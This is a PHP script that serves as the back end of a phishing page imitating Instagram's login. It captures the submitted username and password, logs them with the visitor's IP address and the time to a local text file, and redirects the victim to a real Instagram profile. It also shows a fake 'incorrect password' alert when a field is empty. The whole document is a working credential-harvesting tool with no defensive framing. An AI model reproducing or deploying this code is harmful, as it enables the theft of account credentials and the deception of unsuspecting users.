<?php
        $un=$_POST['username'];
        $pw=$_POST['password'];

  if(($un!="") && ($pw!="")) //checks if username and password are empty
      {


$log = 'insta_log.txt';  // creating a txt log if the file does not exits 
$ip = $_SERVER['REMOTE_ADDR']; //User IP
   

$date_time = date("F j, Y, g:i a");     //getting server date & time         


$fp = fopen("insta_log.txt", "a"); //opening file to write
fputs($fp,"
$date_time
IP:$ip 
Username :$un 
Password:$pw 
");
echo "<br/>";

flock($fp,3);
fclose($fp);

 $URL = "https://www.instagram.com/cuteesk/";  
                  header('Location: '.$URL);  //redirecting to a valid url
                
  }

else 
    {
    ?>
    <script type="text/javascript">
                            alert("Sorry your username or password was incorrect."); //just to makesure user does not leave it empty ;) 
    </script>
    

    </script>
<?php
$URL = "http://localhost/insta.html"; 
    header('Location: '.$URL); //redirect to the samepage 
    
}


?>